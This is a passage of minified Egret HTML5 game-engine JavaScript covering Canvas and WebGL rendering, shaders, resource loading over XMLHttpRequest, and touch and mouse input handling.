		c.prototype.measureText = function (a) {
			return this.canvasContext.measureText(a).width
		};
		c.prototype.drawText = function (a, b, c, d, y) {
			var h = a._strokeColorString,
			g = a.stroke,
			l = this.canvasContext;
			l.fillStyle = a._textColorString;
			l.strokeStyle = h;
			g && (l.lineWidth = 2 * g, l.strokeText(b, c + this._transformTx, d + this._transformTy,
					y || 65535));
			l.fillText(b, c + this._transformTx, d + this._transformTy, y || 65535);
			e.prototype.drawText.call(this, a, b, c, d, y)
		};
		c.prototype.strokeRect = function (a, b, c, d, e) {
			this.canvasContext.strokeStyle = e;
			this.canvasContext.strokeRect(a, b, c, d)
		};
		c.prototype.pushMask = function (a) {
			this.canvasContext.save();
			this.canvasContext.beginPath();
			this.canvasContext.rect(a.x + this._transformTx, a.y + this._transformTy, a.width, a.height);
			this.canvasContext.clip();
			this.canvasContext.closePath()
		};
		c.prototype.popMask = function () {
			this.canvasContext.restore();
			this.canvasContext.setTransform(1, 0, 0, 1, 0, 0)
		};
		return c
	}
	(d.RendererContext);
	d.HTML5CanvasRenderer = e;
	e.prototype.__class__ = "egret.HTML5CanvasRenderer"
})(egret || (egret = {}));
var egret_h5_graphics;
(function (d) {
	d.beginFill = function (d, c) {
		"undefined" === typeof c && (c = 1);
		var a = "rgba(" + (d >> 16) + "," + ((d & 65280) >> 8) + "," + (d & 255) + "," + c + ")";
		this.fillStyleColor = a;
		this.commandQueue.push(new e(this._setStyle, this, [a]))
	};
	d.drawRect = function (d, c, a, b) {
		this.commandQueue.push(new e(function (a, b, c, d) {
				var e = this.renderContext;
				this.canvasContext.beginPath();
				this.canvasContext.rect(e._transformTx + a, e._transformTy + b, c, d);
				this.canvasContext.closePath()
			}, this, [d, c, a, b]));
		this._fill()
	};
	d.drawCircle = function (d, c, a) {
		this.commandQueue.push(new e(function (a,
					c, d) {
				var e = this.renderContext;
				this.canvasContext.beginPath();
				this.canvasContext.arc(e._transformTx + a, e._transformTy + c, d, 0, 2 * Math.PI);
				this.canvasContext.closePath()
			}, this, [d, c, a]));
		this._fill()
	};
	d.lineStyle = function (d, c, a, b, m, u, y, h) {
		"undefined" === typeof d && (d = NaN);
		"undefined" === typeof c && (c = 0);
		"undefined" === typeof a && (a = 1);
		"undefined" === typeof b && (b = !1);
		"undefined" === typeof m && (m = "normal");
		"undefined" === typeof u && (u = null);
		"undefined" === typeof y && (y = null);
		"undefined" === typeof h && (h = 3);
		this.strokeStyleColor &&
		(this.createEndLineCommand(), this.commandQueue.push(this.endLineCommand));
		this.strokeStyleColor = c = "rgba(" + (c >> 16) + "," + ((c & 65280) >> 8) + "," + (c & 255) + "," + a + ")";
		this.commandQueue.push(new e(function (a, b) {
				this.canvasContext.lineWidth = a;
				this.canvasContext.strokeStyle = b;
				this.canvasContext.beginPath()
			}, this, [d, c]));
		"undefined" === typeof this.lineX && (this.lineY = this.lineX = 0);
		this.moveTo(this.lineX, this.lineY)
	};
	d.lineTo = function (d, c) {
		this.commandQueue.push(new e(function (a, b) {
				var c = this.renderContext;
				this.canvasContext.lineTo(c._transformTx +
					a, c._transformTy + b)
			}, this, [d, c]));
		this.lineX = d;
		this.lineY = c
	};
	d.curveTo = function (d, c, a, b) {
		this.commandQueue.push(new e(function (a, b, c, d) {
				var e = this.renderContext;
				this.canvasContext.quadraticCurveTo(e._transformTx + a, e._transformTy + b, c, d)
			}, this, [d, c, a, b]));
		this.lineX = a;
		this.lineY = b
	};
	d.moveTo = function (d, c) {
		this.commandQueue.push(new e(function (a, b) {
				var c = this.renderContext;
				this.canvasContext.moveTo(c._transformTx + a, c._transformTy + b)
			}, this, [d, c]))
	};
	d.clear = function () {
		this.lineY = this.lineX = this.commandQueue.length =
			0;
		this.fillStyleColor = this.strokeStyleColor = null
	};
	d.createEndFillCommand = function () {
		this.endFillCommand || (this.endFillCommand = new e(function () {
					this.canvasContext.fill();
					this.canvasContext.closePath()
				}, this, null))
	};
	d.endFill = function () {
		null != this.fillStyleColor && this._fill();
		this.fillStyleColor = null
	};
	d._fill = function () {
		this.fillStyleColor && (this.createEndFillCommand(), this.commandQueue.push(this.endFillCommand))
	};
	d.createEndLineCommand = function () {
		this.endLineCommand || (this.endLineCommand = new e(function () {
					this.canvasContext.stroke();
					this.canvasContext.closePath()
				}, this, null))
	};
	d._draw = function (d) {
		this.renderContext = d;
		d = this.canvasContext = this.renderContext.canvasContext;
		d.save();
		var c = this.commandQueue.length;
		this.strokeStyleColor && 0 < c && this.commandQueue[c - 1] != this.endLineCommand && (this.createEndLineCommand(), this.commandQueue.push(this.endLineCommand), c = this.commandQueue.length);
		for (var a = 0; a < c; a++) {
			var b = this.commandQueue[a];
			b.method.apply(b.thisObject, b.args)
		}
		d.restore()
	};
	var e = function () {
		return function (d, c, a) {
			this.method =
				d;
			this.thisObject = c;
			this.args = a
		}
	}
	();
	e.prototype.__class__ = "Command";
	d._setStyle = function (d) {
		this.canvasContext.fillStyle = d;
		this.canvasContext.beginPath()
	};
	d.init = function () {
		for (var e in d)
			egret.Graphics.prototype[e] = d[e];
		egret.RendererContext.createRendererContext = function (c) {
			return new egret.HTML5CanvasRenderer(c)
		}
	}
})(egret_h5_graphics || (egret_h5_graphics = {}));
egret_h5_graphics.init();
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a) {
			e.call(this);
			this.size = 2E3;
			this.vertSize = 6;
			this.contextLost = !1;
			this.glContextId = 0;
			this.currentBlendMode = "";
			this.currentBaseTexture = null;
			this.currentBatchSize = 0;
			this.maskList = [];
			this.maskDataFreeList = [];
			this.canvasContext = document.createElement("canvas").getContext("2d");
			console.log("\u4f7f\u7528WebGL\u6a21\u5f0f");
			this.canvas = a;
			a.addEventListener("webglcontextlost", this.handleContextLost.bind(this), !1);
			a.addEventListener("webglcontextrestored", this.handleContextRestored.bind(this),
				!1);
			this.projectionX = a.width / 2;
			this.projectionY = -a.height / 2;
			a = 6 * this.size;
			this.vertices = new Float32Array(4 * this.size * this.vertSize);
			this.indices = new Uint16Array(a);
			for (var b = 0, c = 0; b < a; b += 6, c += 4)
				this.indices[b + 0] = c + 0, this.indices[b + 1] = c + 1, this.indices[b + 2] = c + 2, this.indices[b + 3] = c + 0, this.indices[b + 4] = c + 2, this.indices[b + 5] = c + 3;
			this.initWebGL();
			this.shaderManager = new d.WebGLShaderManager(this.gl);
			this.worldTransform = new d.Matrix;
			this.initBlendMode();
			d.MainContext.instance.addEventListener(d.Event.FINISH_RENDER,
				this._draw, this);
			d.TextField.prototype._draw = function (a) {
				this.getDirty() && (this.cacheAsBitmap = !0);
				d.DisplayObject.prototype._draw.call(this, a)
			}
		}
		__extends(c, e);
		c.prototype.handleContextLost = function () {
			this.contextLost = !0
		};
		c.prototype.handleContextRestored = function () {
			this.initWebGL();
			this.shaderManager.setContext(this.gl);
			this.contextLost = !1
		};
		c.prototype.initWebGL = function () {
			for (var a = {
					stencil : !0
				}, b, c = ["experimental-webgl", "webgl"], d = 0; d < c.length; d++) {
				try {
					b = this.canvas.getContext(c[d], a)
				} catch (e) {}

				if (b)
					break
			}
			if (!b)
				throw Error("\u5f53\u524d\u6d4f\u89c8\u5668\u4e0d\u652f\u6301webgl");
			this.setContext(b)
		};
		c.prototype.setContext = function (a) {
			this.gl = a;
			a.id = this.glContextId++;
			this.vertexBuffer = a.createBuffer();
			this.indexBuffer = a.createBuffer();
			a.bindBuffer(a.ELEMENT_ARRAY_BUFFER, this.indexBuffer);
			a.bufferData(a.ELEMENT_ARRAY_BUFFER, this.indices, a.STATIC_DRAW);
			a.bindBuffer(a.ARRAY_BUFFER, this.vertexBuffer);
			a.bufferData(a.ARRAY_BUFFER, this.vertices, a.DYNAMIC_DRAW);
			a.disable(a.DEPTH_TEST);
			a.disable(a.CULL_FACE);
			a.enable(a.BLEND);
			a.colorMask(!0, !0, !0, !0)
		};
		c.prototype.initBlendMode = function () {
			c.blendModesWebGL[d.BlendMode.NORMAL] =
				[this.gl.ONE, this.gl.ONE_MINUS_SRC_ALPHA];
			c.blendModesWebGL[d.BlendMode.ADD] = [this.gl.SRC_ALPHA, this.gl.DST_ALPHA]
		};
		c.prototype.start = function () {
			if (!this.contextLost) {
				var a = this.gl;
				a.activeTexture(a.TEXTURE0);
				a.bindBuffer(a.ARRAY_BUFFER, this.vertexBuffer);
				a.bindBuffer(a.ELEMENT_ARRAY_BUFFER, this.indexBuffer);
				var b = this.shaderManager.defaultShader;
				a.uniform2f(b.projectionVector, this.projectionX, this.projectionY);
				var c = 4 * this.vertSize;
				a.vertexAttribPointer(b.aVertexPosition, 2, a.FLOAT, !1, c, 0);
				a.vertexAttribPointer(b.aTextureCoord,
					2, a.FLOAT, !1, c, 8);
				a.vertexAttribPointer(b.colorAttribute, 2, a.FLOAT, !1, c, 16)
			}
		};
		c.prototype.clearScreen = function () {
			var a = this.gl;
			a.colorMask(!0, !0, !0, !0);
			for (var b = d.RenderFilter.getInstance().getDrawAreaList(), c = 0, e = b.length; c < e; c++) {
				var f = b[c];
				a.viewport(f.x, f.y, f.width, f.height);
				a.bindFramebuffer(a.FRAMEBUFFER, null);
				a.clearColor(0, 0, 0, 0);
				a.clear(a.COLOR_BUFFER_BIT)
			}
			this.renderCost = 0
		};
		c.prototype.setBlendMode = function (a) {
			a || (a = d.BlendMode.NORMAL);
			if (this.currentBlendMode != a) {
				var b = c.blendModesWebGL[a];
				b && (this.gl.blendFunc(b[0], b[1]), this.currentBlendMode = a)
			}
		};
		c.prototype.drawImage = function (a, b, c, e, f, h, g, l, k) {
			if (!this.contextLost) {
				var n = d.MainContext.instance.rendererContext.texture_scale_factor;
				b /= n;
				c /= n;
				e /= n;
				f /= n;
				this.createWebGLTexture(a);
				if (a.webGLTexture !== this.currentBaseTexture || this.currentBatchSize >= this.size)
					this._draw(), this.currentBaseTexture = a.webGLTexture;
				var q = this.worldTransform,
				p = q.a,
				r = q.b,
				x = q.c,
				z = q.d,
				v = q.tx,
				A = q.ty;
				0 == h && 0 == g || q.append(1, 0, 0, 1, h, g);
				1 == e / l && 1 == f / k || q.append(l / e,
					0, 0, k / f, 0, 0);
				h = q.a;
				g = q.b;
				l = q.c;
				k = q.d;
				var n = q.tx,
				t = q.ty;
				q.a = p;
				q.b = r;
				q.c = x;
				q.d = z;
				q.tx = v;
				q.ty = A;
				p = a._sourceWidth;
				r = a._sourceHeight;
				a = e;
				q = f;
				b /= p;
				c /= r;
				e /= p;
				f /= r;
				p = this.vertices;
				r = 4 * this.currentBatchSize * this.vertSize;
				x = this.worldAlpha;
				p[r++] = n;
				p[r++] = t;
				p[r++] = b;
				p[r++] = c;
				p[r++] = x;
				p[r++] = 16777215;
				p[r++] = h * a + n;
				p[r++] = g * a + t;
				p[r++] = e + b;
				p[r++] = c;
				p[r++] = x;
				p[r++] = 16777215;
				p[r++] = h * a + l * q + n;
				p[r++] = k * q + g * a + t;
				p[r++] = e + b;
				p[r++] = f + c;
				p[r++] = x;
				p[r++] = 16777215;
				p[r++] = l * q + n;
				p[r++] = k * q + t;
				p[r++] = b;
				p[r++] = f + c;
				p[r++] = x;
				p[r++] =
					16777215;
				this.currentBatchSize++
			}
		};
		c.prototype._draw = function () {
			if (0 != this.currentBatchSize && !this.contextLost) {
				var a = d.getTimer();
				this.start();
				var b = this.gl;
				b.bindTexture(b.TEXTURE_2D, this.currentBaseTexture);
				var c = this.vertices.subarray(0, 4 * this.currentBatchSize * this.vertSize);
				b.bufferSubData(b.ARRAY_BUFFER, 0, c);
				b.drawElements(b.TRIANGLES, 6 * this.currentBatchSize, b.UNSIGNED_SHORT, 0);
				this.currentBatchSize = 0;
				this.renderCost += d.getTimer() - a;
				d.Profiler.getInstance().onDrawImage()
			}
		};
		c.prototype.setTransform =
		function (a) {
			var b = this.worldTransform;
			b.a = a.a;
			b.b = a.b;
			b.c = a.c;
			b.d = a.d;
			b.tx = a.tx;
			b.ty = a.ty
		};
		c.prototype.setAlpha = function (a, b) {
			this.worldAlpha = a;
			b && this.setBlendMode(b)
		};
		c.prototype.createWebGLTexture = function (a) {
			if (!a.webGLTexture) {
				var b = this.gl;
				a.webGLTexture = b.createTexture();
				b.bindTexture(b.TEXTURE_2D, a.webGLTexture);
				b.pixelStorei(b.UNPACK_PREMULTIPLY_ALPHA_WEBGL, !0);
				b.texImage2D(b.TEXTURE_2D, 0, b.RGBA, b.RGBA, b.UNSIGNED_BYTE, a._bitmapData);
				b.texParameteri(b.TEXTURE_2D, b.TEXTURE_MAG_FILTER, b.LINEAR);
				b.texParameteri(b.TEXTURE_2D, b.TEXTURE_MIN_FILTER, b.LINEAR);
				b.texParameteri(b.TEXTURE_2D, b.TEXTURE_WRAP_S, b.CLAMP_TO_EDGE);
				b.texParameteri(b.TEXTURE_2D, b.TEXTURE_WRAP_T, b.CLAMP_TO_EDGE);
				b.bindTexture(b.TEXTURE_2D, null)
			}
		};
		c.prototype.pushMask = function (a) {
			this._draw();
			var b = this.gl;
			0 == this.maskList.length && (b.enable(b.STENCIL_TEST), b.stencilFunc(b.ALWAYS, 1, 1));
			var c = this.maskDataFreeList.pop();
			c ? (c.x = a.x, c.y = a.y, c.w = a.width, c.h = a.height) : c = {
				x : a.x,
				y : a.y,
				w : a.width,
				h : a.height
			};
			this.maskList.push(c);
			b.colorMask(!1,
				!1, !1, !1);
			b.stencilOp(b.KEEP, b.KEEP, b.INCR);
			this.renderGraphics(c);
			b.colorMask(!0, !0, !0, !0);
			b.stencilFunc(b.NOTEQUAL, 0, this.maskList.length);
			b.stencilOp(b.KEEP, b.KEEP, b.KEEP)
		};
		c.prototype.popMask = function () {
			this._draw();
			var a = this.gl,
			b = this.maskList.pop();
			b && (a.colorMask(!1, !1, !1, !1), a.stencilOp(a.KEEP, a.KEEP, a.DECR), this.renderGraphics(b), a.colorMask(!0, !0, !0, !0), a.stencilFunc(a.NOTEQUAL, 0, this.maskList.length), a.stencilOp(a.KEEP, a.KEEP, a.KEEP), this.maskDataFreeList.push(b));
			0 == this.maskList.length &&
			a.disable(a.STENCIL_TEST)
		};
		c.prototype.setupFont = function (a) {
			var b = this.canvasContext,
			c = a.italic ? "italic " : "normal ",
			c = c + (a.bold ? "bold " : "normal "),
			c = c + (a.size + "px " + a.fontFamily);
			b.font = c;
			b.textAlign = "left";
			b.textBaseline = "middle"
		};
		c.prototype.measureText = function (a) {
			return this.canvasContext.measureText(a).width
		};
		c.prototype.renderGraphics = function (a) {
			var b = this.gl,
			c = this.shaderManager.primitiveShader;
			this.graphicsPoints ? (this.graphicsPoints.length = 0, this.graphicsIndices.length = 0) : (this.graphicsPoints =
					[], this.graphicsIndices = [], this.graphicsBuffer = b.createBuffer(), this.graphicsIndexBuffer = b.createBuffer());
			this.updateGraphics(a);
			this.shaderManager.activateShader(c);
			b.blendFunc(b.ONE, b.ONE_MINUS_SRC_ALPHA);
			b.uniformMatrix3fv(c.translationMatrix, !1, this.worldTransform.toArray(!0));
			b.uniform2f(c.projectionVector, this.projectionX, -this.projectionY);
			b.uniform2f(c.offsetVector, 0, 0);
			b.uniform3fv(c.tintColor, [1, 1, 1]);
			b.uniform1f(c.alpha, this.worldAlpha);
			b.bindBuffer(b.ARRAY_BUFFER, this.graphicsBuffer);
			b.vertexAttribPointer(c.aVertexPosition, 2, b.FLOAT, !1, 24, 0);
			b.vertexAttribPointer(c.colorAttribute, 4, b.FLOAT, !1, 24, 8);
			b.bindBuffer(b.ELEMENT_ARRAY_BUFFER, this.graphicsIndexBuffer);
			b.drawElements(b.TRIANGLE_STRIP, this.graphicsIndices.length, b.UNSIGNED_SHORT, 0);
			this.shaderManager.activateShader(this.shaderManager.defaultShader)
		};
		c.prototype.updateGraphics = function (a) {
			var b = this.gl;
			this.buildRectangle(a);
			b.bindBuffer(b.ARRAY_BUFFER, this.graphicsBuffer);
			b.bufferData(b.ARRAY_BUFFER, new Float32Array(this.graphicsPoints),
				b.STATIC_DRAW);
			b.bindBuffer(b.ELEMENT_ARRAY_BUFFER, this.graphicsIndexBuffer);
			b.bufferData(b.ELEMENT_ARRAY_BUFFER, new Uint16Array(this.graphicsIndices), b.STATIC_DRAW)
		};
		c.prototype.buildRectangle = function (a) {
			var b = a.x,
			c = a.y,
			d = a.w;
			a = a.h;
			var e = this.graphicsPoints,
			f = this.graphicsIndices,
			g = e.length / 6;
			e.push(b, c);
			e.push(0, 0, 0, 1);
			e.push(b + d, c);
			e.push(0, 0, 0, 1);
			e.push(b, c + a);
			e.push(0, 0, 0, 1);
			e.push(b + d, c + a);
			e.push(0, 0, 0, 1);
			f.push(g, g, g + 1, g + 2, g + 3, g + 3)
		};
		c.blendModesWebGL = {};
		return c
	}
	(d.RendererContext);
	d.WebGLRenderer =
		e;
	e.prototype.__class__ = "egret.WebGLRenderer"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.compileProgram = function (c, a, b) {
			b = d.compileFragmentShader(c, b);
			a = d.compileVertexShader(c, a);
			var e = c.createProgram();
			c.attachShader(e, a);
			c.attachShader(e, b);
			c.linkProgram(e);
			c.getProgramParameter(e, c.LINK_STATUS) || console.log("\u65e0\u6cd5\u521d\u59cb\u5316\u7740\u8272\u5668");
			return e
		};
		d.compileFragmentShader = function (c, a) {
			return d._compileShader(c, a, c.FRAGMENT_SHADER)
		};
		d.compileVertexShader = function (c, a) {
			return d._compileShader(c, a, c.VERTEX_SHADER)
		};
		d._compileShader =
		function (c, a, b) {
			b = c.createShader(b);
			c.shaderSource(b, a);
			c.compileShader(b);
			return c.getShaderParameter(b, c.COMPILE_STATUS) ? b : (console.log(c.getShaderInfoLog(b)), null)
		};
		d.checkCanUseWebGL = function () {
			if (void 0 == d.canUseWebGL)
				try {
					var c = document.createElement("canvas");
					d.canUseWebGL = !!window.WebGLRenderingContext && !(!c.getContext("webgl") && !c.getContext("experimental-webgl"))
				} catch (a) {
					d.canUseWebGL = !1
				}
			return d.canUseWebGL
		};
		return d
	}
	();
	d.WebGLUtils = e;
	e.prototype.__class__ = "egret.WebGLUtils"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function a(a) {
			this.maxAttibs = 10;
			this.attribState = [];
			this.tempAttribState = [];
			for (var c = 0; c < this.maxAttibs; c++)
				this.attribState[c] = !1;
			this.setContext(a)
		}
		a.prototype.setContext = function (a) {
			this.gl = a;
			this.primitiveShader = new c(a);
			this.defaultShader = new f(a);
			this.activateShader(this.defaultShader)
		};
		a.prototype.activateShader = function (a) {
			this.gl.useProgram(a.program);
			this.setAttribs(a.attributes)
		};
		a.prototype.setAttribs = function (a) {
			var c,
			d;
			d = this.tempAttribState.length;
			for (c =
					0; c < d; c++)
				this.tempAttribState[c] = !1;
			d = a.length;
			for (c = 0; c < d; c++)
				this.tempAttribState[a[c]] = !0;
			a = this.gl;
			d = this.attribState.length;
			for (c = 0; c < d; c++)
				this.attribState[c] !== this.tempAttribState[c] && (this.attribState[c] = this.tempAttribState[c], this.tempAttribState[c] ? a.enableVertexAttribArray(c) : a.disableVertexAttribArray(c))
		};
		return a
	}
	();
	d.WebGLShaderManager = e;
	e.prototype.__class__ = "egret.WebGLShaderManager";
	var f = function () {
		function a(a) {
			this.defaultVertexSrc = "attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec2 aColor;\nuniform vec2 projectionVector;\nuniform vec2 offsetVector;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nconst vec2 center = vec2(-1.0, 1.0);\nvoid main(void) {\n   gl_Position = vec4( ((aVertexPosition + offsetVector) / projectionVector) + center , 0.0, 1.0);\n   vTextureCoord = aTextureCoord;\n   vec3 color = mod(vec3(aColor.y/65536.0, aColor.y/256.0, aColor.y), 256.0) / 256.0;\n   vColor = vec4(color * aColor.x, aColor.x);\n}";
			this.program = null;
			this.fragmentSrc = "precision lowp float;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nuniform sampler2D uSampler;\nvoid main(void) {\n   gl_FragColor = texture2D(uSampler, vTextureCoord) * vColor ;\n}";
			this.gl = a;
			this.init()
		}
		a.prototype.init = function () {
			var a = this.gl,
			c = d.WebGLUtils.compileProgram(a, this.defaultVertexSrc, this.fragmentSrc);
			a.useProgram(c);
			this.uSampler = a.getUniformLocation(c, "uSampler");
			this.projectionVector = a.getUniformLocation(c, "projectionVector");
			this.offsetVector =
				a.getUniformLocation(c, "offsetVector");
			this.dimensions = a.getUniformLocation(c, "dimensions");
			this.aVertexPosition = a.getAttribLocation(c, "aVertexPosition");
			this.aTextureCoord = a.getAttribLocation(c, "aTextureCoord");
			this.colorAttribute = a.getAttribLocation(c, "aColor");
			-1 === this.colorAttribute && (this.colorAttribute = 2);
			this.attributes = [this.aVertexPosition, this.aTextureCoord, this.colorAttribute];
			this.program = c
		};
		return a
	}
	();
	d.EgretShader = f;
	f.prototype.__class__ = "egret.EgretShader";
	var c = function () {
		function a(a) {
			this.alpha =
				this.translationMatrix = this.attributes = this.colorAttribute = this.aVertexPosition = this.tintColor = this.offsetVector = this.projectionVector = this.program = null;
			this.fragmentSrc = "precision mediump float;\nvarying vec4 vColor;\nvoid main(void) {\n   gl_FragColor = vColor;\n}";
			this.vertexSrc = "attribute vec2 aVertexPosition;\nattribute vec4 aColor;\nuniform mat3 translationMatrix;\nuniform vec2 projectionVector;\nuniform vec2 offsetVector;\nuniform float alpha;\nuniform vec3 tint;\nvarying vec4 vColor;\nvoid main(void) {\n   vec3 v = translationMatrix * vec3(aVertexPosition , 1.0);\n   v -= offsetVector.xyx;\n   gl_Position = vec4( v.x / projectionVector.x -1.0, v.y / -projectionVector.y + 1.0 , 0.0, 1.0);\n   vColor = aColor * vec4(tint * alpha, alpha);\n}";
			this.gl = a;
			this.init()
		}
		a.prototype.init = function () {
			var a = this.gl,
			c = d.WebGLUtils.compileProgram(a, this.vertexSrc, this.fragmentSrc);
			a.useProgram(c);
			this.projectionVector = a.getUniformLocation(c, "projectionVector");
			this.offsetVector = a.getUniformLocation(c, "offsetVector");
			this.tintColor = a.getUniformLocation(c, "tint");
			this.aVertexPosition = a.getAttribLocation(c, "aVertexPosition");
			this.colorAttribute = a.getAttribLocation(c, "aColor");
			this.attributes = [this.aVertexPosition, this.colorAttribute];
			this.translationMatrix =
				a.getUniformLocation(c, "translationMatrix");
			this.alpha = a.getUniformLocation(c, "alpha");
			this.program = c
		};
		return a
	}
	();
	d.PrimitiveShader = c;
	c.prototype.__class__ = "egret.PrimitiveShader"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this)
		}
		__extends(c, e);
		c.prototype.proceed = function (a) {
			function b(b) {
				d.IOErrorEvent.dispatchIOErrorEvent(a)
			}
			function c(b) {
				switch (a.dataFormat) {
				case d.URLLoaderDataFormat.TEXT:
					a.data = f.responseText;
					break;
				case d.URLLoaderDataFormat.VARIABLES:
					a.data = new d.URLVariables(f.responseText);
					break;
				case d.URLLoaderDataFormat.BINARY:
					a.data = f.response;
					break;
				default:
					a.data = f.responseText
				}
				d.callLater(d.Event.dispatchEvent, d.Event, a, d.Event.COMPLETE)
			}
			if (a.dataFormat ==
				d.URLLoaderDataFormat.TEXTURE)
				this.loadTexture(a);
			else if (a.dataFormat == d.URLLoaderDataFormat.SOUND)
				this.loadSound(a);
			else {
				var e = a._request,
				f = this.getXHR();
				f.onerror = b;
				f.onload = c;
				f.open(e.method, e.url, !0);
				this.setResponseType(f, a.dataFormat);
				e.method != d.URLRequestMethod.GET && e.data ? e.data instanceof d.URLVariables ? (f.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), f.send(e.data.toString())) : (f.setRequestHeader("Content-Type", "multipart/form-data"), f.send(e.data)) : f.send()
			}
		};
		c.prototype.loadSound =
		function (a) {
			function b(f) {
				window.clearTimeout(e.__timeoutId);
				e.removeEventListener("canplaythrough", b, !1);
				e.removeEventListener("error", c, !1);
				f = new d.Sound;
				f.audio = e;
				a.data = f;
				d.callLater(d.Event.dispatchEvent, d.Event, a, d.Event.COMPLETE)
			}
			function c(f) {
				window.clearTimeout(e.__timeoutId);
				e.removeEventListener("canplaythrough", b, !1);
				e.removeEventListener("error", c, !1);
				d.IOErrorEvent.dispatchIOErrorEvent(a)
			}
			var e = new Audio(a._request.url);
			e.__timeoutId = window.setTimeout(b, 100);
			e.addEventListener("canplaythrough",
				b, !1);
			e.addEventListener("error", c, !1);
			e.load()
		};
		c.prototype.getXHR = function () {
			return window.XMLHttpRequest ? new window.XMLHttpRequest : new ActiveXObject("MSXML2.XMLHTTP")
		};
		c.prototype.setResponseType = function (a, b) {
			switch (b) {
			case d.URLLoaderDataFormat.TEXT:
			case d.URLLoaderDataFormat.VARIABLES:
				a.responseType = d.URLLoaderDataFormat.TEXT;
				break;
			case d.URLLoaderDataFormat.BINARY:
				a.responseType = "arraybuffer";
				break;
			default:
				a.responseType = b
			}
		};
		c.prototype.loadTexture = function (a) {
			var b = a._request,
			c = new Image;
			c.crossOrigin = "Anonymous";
			c.onload = function (b) {
				c.onerror = null;
				c.onload = null;
				b = new d.Texture;
				b._setBitmapData(c);
				a.data = b;
				d.callLater(d.Event.dispatchEvent, d.Event, a, d.Event.COMPLETE)
			};
			c.onerror = function (b) {
				c.onerror = null;
				c.onload = null;
				d.IOErrorEvent.dispatchIOErrorEvent(a)
			};
			c.src = b.url
		};
		return c
	}
	(d.NetContext);
	d.HTML5NetContext = e;
	e.prototype.__class__ = "egret.HTML5NetContext"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a) {
			e.call(this);
			this.canvas = a;
			this._isTouchDown = !1
		}
		__extends(c, e);
		c.prototype.run = function () {
			var a = this;
			window.navigator.msPointerEnabled ? (this.canvas.addEventListener("MSPointerDown", function (b) {
					a._onTouchBegin(b);
					b.stopPropagation();
					b.preventDefault()
				}, !1), this.canvas.addEventListener("MSPointerMove", function (b) {
					a._onTouchMove(b);
					b.stopPropagation();
					b.preventDefault()
				}, !1), this.canvas.addEventListener("MSPointerUp", function (b) {
					a._onTouchEnd(b);
					b.stopPropagation();
					b.preventDefault()
				}, !1)) : d.MainContext.deviceType == d.MainContext.DEVICE_MOBILE ? this.addTouchListener() : d.MainContext.deviceType == d.MainContext.DEVICE_PC && (this.addTouchListener(), this.addMouseListener());
			window.addEventListener("mousedown", function (b) {
				a.inOutOfCanvas(b) ? a.dispatchLeaveStageEvent() : a._isTouchDown = !0
			});
			window.addEventListener("mouseup", function (b) {
				a._isTouchDown && a.inOutOfCanvas(b) && a.dispatchLeaveStageEvent();
				a._isTouchDown = !1
			})
		};
		c.prototype.addMouseListener = function () {
			var a = this;
			this.canvas.addEventListener("mousedown", function (b) {
				a._onTouchBegin(b)
			});
			this.canvas.addEventListener("mousemove", function (b) {
				a._onTouchMove(b)
			});
			this.canvas.addEventListener("mouseup", function (b) {
				a._onTouchEnd(b)
			})
		};
		c.prototype.addTouchListener = function () {
			var a = this;
			this.canvas.addEventListener("touchstart", function (b) {
				for (var c = b.changedTouches.length, d = 0; d < c && d < a.maxTouches; d++)
					a._onTouchBegin(b.changedTouches[d]);
				b.stopPropagation();
				b.preventDefault()
			}, !1);
			this.canvas.addEventListener("touchmove",
				function (b) {
				for (var c = b.changedTouches.length, d = 0; d < c && d < a.maxTouches; d++)
					a._onTouchMove(b.changedTouches[d]);
				b.stopPropagation();
				b.preventDefault()
			}, !1);
			this.canvas.addEventListener("touchend", function (b) {
				for (var c = b.changedTouches.length, d = 0; d < c && d < a.maxTouches; d++)
					a._onTouchEnd(b.changedTouches[d]);
				b.stopPropagation();
				b.preventDefault()
			}, !1);
			this.canvas.addEventListener("touchcancel", function (b) {
				for (var c = b.changedTouches.length, d = 0; d < c && d < a.maxTouches; d++)
					a._onTouchEnd(b.changedTouches[d]);
				b.stopPropagation();
				b.preventDefault()
			}, !1)
		};
		c.prototype.inOutOfCanvas = function (a) {
			a = this.getLocation(this.canvas, a);
			return 0 > a.x || 0 > a.y || a.x > this.canvas.width || a.y > this.canvas.height ? !0 : !1
		};
		c.prototype.dispatchLeaveStageEvent = function () {
			d.MainContext.instance.stage.dispatchEventWith(d.Event.LEAVE_STAGE)
		};
		c.prototype._onTouchBegin = function (a) {
			var b = this.getLocation(this.canvas, a),
			c = -1;
			a.hasOwnProperty("identifier") && (c = a.identifier);
			this.onTouchBegan(b.x, b.y, c)
		};
		c.prototype._onTouchMove = function (a) {
			var b = this.getLocation(this.canvas,
					a),
			c = -1;
			a.hasOwnProperty("identifier") && (c = a.identifier);
			this.onTouchMove(b.x, b.y, c)
		};
		c.prototype._onTouchEnd = function (a) {
			var b = this.getLocation(this.canvas, a),
			c = -1;
			a.hasOwnProperty("identifier") && (c = a.identifier);
			this.onTouchEnd(b.x, b.y, c)
		};
		c.prototype.getLocation = function (a, b) {
			var c = document.documentElement,
			e = window,
			f,
			h;
			"function" === typeof a.getBoundingClientRect ? (h = a.getBoundingClientRect(), f = h.left, h = h.top) : h = f = 0;
			f += e.pageXOffset - c.clientLeft;
			h += e.pageYOffset - c.clientTop;
			null != b.pageX ? (c = b.pageX,
				e = b.pageY) : (f -= document.body.scrollLeft, h -= document.body.scrollTop, c = b.clientX, e = b.clientY);
			var g = d.Point.identity;
